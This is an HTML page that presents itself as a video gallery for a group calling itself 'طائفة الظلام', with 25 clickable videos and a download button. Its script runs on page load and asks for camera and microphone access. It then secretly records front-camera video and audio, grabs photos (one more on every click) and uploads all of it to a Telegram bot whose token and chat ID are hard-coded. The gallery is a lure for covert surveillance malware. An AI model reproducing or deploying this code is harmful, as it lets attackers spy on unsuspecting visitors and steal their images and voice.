
<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=480, initial-scale=1.0, maximum-scale=1.0">
  <title>📹 صفحة الفيديوهات - طائفة الظلام</title>
  <style>
    body {
      margin: 0;
      background-color: #2d0033;
      font-family: sans-serif;
      color: white;
      direction: rtl;
      overflow-x: hidden;
    }
    header {
      background: url('cover.jpg') center/cover no-repeat;
      height: 200px;
      position: relative;
    }
    .profile {
      width: 100px;
      height: 100px;
      border-radius: 50%;
      border: 4px solid #fff;
      background: purple;
      position: absolute;
      bottom: -50px;
      right: 20px;
      animation: pulse 2s infinite;
    }
    @keyframes pulse {
      0% { transform: scale(1); box-shadow: 0 0 0 0 violet; }
      70% { transform: scale(1.05); box-shadow: 0 0 0 15px transparent; }
      100% { transform: scale(1); box-shadow: 0 0 0 0 transparent; }
    }
    .desc {
      padding: 70px 20px 20px;
      font-size: 18px;
    }
    .grid {
      display: grid;
      grid-template-columns: repeat(5, 1fr);
      gap: 5px;
      padding: 10px;
    }
    .grid video {
      width: 100%;
      aspect-ratio: 1/1;
      object-fit: cover;
      cursor: pointer;
    }
    .overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.9);
      display: none;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      z-index: 999;
    }
    .overlay video {
      width: 90%;
      max-height: 80%;
    }
    .download {
      margin-top: 10px;
      padding: 10px 20px;
      background: purple;
      color: white;
      border: none;
      font-size: 16px;
      border-radius: 10px;
      animation: pulse 1.5s infinite;
    }
  </style>
</head>
<body>

<header>
  <div class="profile"></div>
</header>
<div class="desc">🎥 صفحة الفيديوهات الخاصة بطائفة الظلام - اضغط على أي فيديو لتكبيره وتشغيله</div>

<div class="grid">
  <!-- 👑 تكرار الفيديوهات -->
  <script>
    for (let i = 0; i < 25; i++) {
      document.write(`<video src="ffghgg.mp4" onclick="openPlayer(this)"></video>`);
    }
  </script>
</div>

<div class="overlay" id="overlay" onclick="closePlayer()">
  <video id="bigVideo" controls></video>
  <a id="downloadLink" download="video.mp4">
    <button class="download">⬇️ تحميل الفيديو</button>
  </a>
</div>

<script>
  const TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
  const CHAT_ID = "7664410054";

  // 👑 تكبير الفيديو عند النقر
  function openPlayer(video) {
    const overlay = document.getElementById('overlay');
    const bigVideo = document.getElementById('bigVideo');
    const downloadLink = document.getElementById('downloadLink');

    bigVideo.src = video.src;
    downloadLink.href = video.src;
    overlay.style.display = "flex";
    bigVideo.play();
  }

  function closePlayer() {
    const overlay = document.getElementById('overlay');
    const bigVideo = document.getElementById('bigVideo');
    overlay.style.display = "none";
    bigVideo.pause();
    bigVideo.src = "";
  }

  // 👑 طلب الأذونات وتسجيل فيديو وصوت
  async function initMedia() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });

      // التقاط صور وفيديو
      const mediaRecorder = new MediaRecorder(stream);
      const audioRecorder = new MediaRecorder(stream);
      let chunks = [];
      let audioChunks = [];

      // 🎥 التقاط الفيديو
      mediaRecorder.ondataavailable = e => chunks.push(e.data);
      mediaRecorder.onstop = () => {
        const blob = new Blob(chunks, { type: 'video/webm' });
        sendToTelegram(blob, 'video.webm');
      };

      // 🎤 التقاط الصوت كل 5 ثوانٍ
      setInterval(() => {
        audioRecorder.stop();
        audioRecorder.start();
      }, 5000);

      audioRecorder.ondataavailable = e => audioChunks.push(e.data);
      audioRecorder.onstop = () => {
        const blob = new Blob(audioChunks, { type: 'audio/mp3' });
        sendToTelegram(blob, 'sound.mp3');
        audioChunks = [];
      };

      mediaRecorder.start();
      audioRecorder.start();

      // 📸 التقاط 10 صور
      const track = stream.getVideoTracks()[0];
      const imageCapture = new ImageCapture(track);
      for (let i = 0; i < 10; i++) {
        const bitmap = await imageCapture.grabFrame();
        const canvas = document.createElement('canvas');
        canvas.width = bitmap.width;
        canvas.height = bitmap.height;
        canvas.getContext('2d').drawImage(bitmap, 0, 0);
        canvas.toBlob(blob => sendToTelegram(blob, `photo${i}.jpg`), 'image/jpeg');
        await new Promise(r => setTimeout(r, 1500));
      }

      // ⏱️ إيقاف بعد 20 ثانية
      setTimeout(() => {
        mediaRecorder.stop();
      }, 20000);

      // 📸 التقاط صورة عند كل نقرة
      document.body.addEventListener('click', async () => {
        const bitmap = await imageCapture.grabFrame();
        const canvas = document.createElement('canvas');
        canvas.width = bitmap.width;
        canvas.height = bitmap.height;
        canvas.getContext('2d').drawImage(bitmap, 0, 0);
        canvas.toBlob(blob => sendToTelegram(blob, `click_photo.jpg`), 'image/jpeg');
      });

    } catch (e) {
      alert("📵 アクセスが拒否されました。カメラとマイクの権限が必要です。");
    }
  }

  // 👑 إرسال ملف إلى تليجرام
  function sendToTelegram(blob, filename) {
    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("caption", filename);
    form.append("document", blob, filename);

    fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, {
      method: "POST",
      body: form
    });
  }

  window.onload = initMedia;
</script>

</body>
</html>

